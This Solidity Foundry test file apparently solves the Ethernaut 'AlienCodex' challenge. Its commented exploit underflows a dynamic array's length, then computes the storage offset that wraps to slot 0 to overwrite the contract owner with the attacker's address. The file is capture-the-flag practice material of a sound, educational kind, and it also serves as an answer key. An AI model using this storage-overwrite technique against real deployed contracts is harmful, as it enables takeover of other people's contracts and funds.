// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IAlienCodexTest {
  function make_contact() external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;
}

contract AlienCodexTest is Test {
  uint256 internal constant MAX_UINT256 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;


  IAlienCodexTest internal challenge;
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x40055E69E7EB12620c8CCBCCAb1F187883301c30);
    challenge = IAlienCodexTest(challengeAddress);
  }

  function testExploit() public {
    // all the other functions have a modifier
    // requiring you to invoke this one first
    challenge.make_contact();

    // this function will underflow the length of the dynamic array at slot1 to 0xff...ff
    // meaning that now the EVM thinks that we have 2**256 - 1 elements there.
    // this way we don't revert on an out of bonds condition.
    challenge.retract();

    // now we need our trick to write into slot0 (0x00...00)

    // - here is where the first element of codex should be stored
    bytes32 firstElementSlot = keccak256(abi.encodePacked(uint256(1)));

    // - 0x00...00 = firstElementSlot + offset =>
    //   - offset = 0x00...00 - firstElement = 1 + 0xff...ff - firstElement
    //   - that substraction can be done with an XOR
    uint256 offset = uint256(bytes32(MAX_UINT256) ^ firstElementSlot) + 1;

    // write!
    challenge.revise(offset, bytes32(uint256(uint160(address(this)))));

    utils.submitLevelInstance(challengeAddress);
  }
}
